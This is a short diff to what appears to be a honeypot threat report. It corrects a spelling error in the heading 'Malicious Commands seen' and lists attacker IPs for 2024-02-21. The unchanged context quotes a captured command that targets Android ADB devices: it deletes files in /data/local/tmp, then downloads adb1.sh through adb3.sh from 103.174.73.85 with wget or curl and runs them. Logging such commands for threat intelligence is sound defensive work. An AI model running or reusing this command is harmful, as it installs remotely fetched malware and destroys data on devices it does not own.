@@ -6,7 +6,7 @@ Top 5 IPs for 2024-02-21:
 202.137.26.6
 150.109.204.117
 
-Malcious Commands seen:
+Malicious Commands seen:
 
 cd /data/local/tmp/;rm -rf *sh* ; rm -rf *arm* ; rm -rf *ppc* ; rm -rf *x86* ; rm -rf *mips* ;rm -rf *mpsl* ; rm -rf *spc* ; rm -rf *m68k* ; busybox wget http://103.174.73.85/adb1.sh; sh adb1.sh; wget http://103.174.73.85/adb1.sh; sh adb1.sh; curl http://103.174.73.85/adb1.sh; sh adb1.sh; busybox wget http://103.174.73.85/adb2.sh; sh adb2.sh; wget http://103.174.73.85/adb2.sh; sh adb2.sh; curl http://103.174.73.85/adb2.sh; sh adb2.sh; busybox wget http://103.174.73.85/adb3.sh; sh adb3.sh; wget http://103.174.73.85/adb3.sh; sh adb3.sh; curl http://103.174.73.85/adb3.sh; sh adb3.sh
 
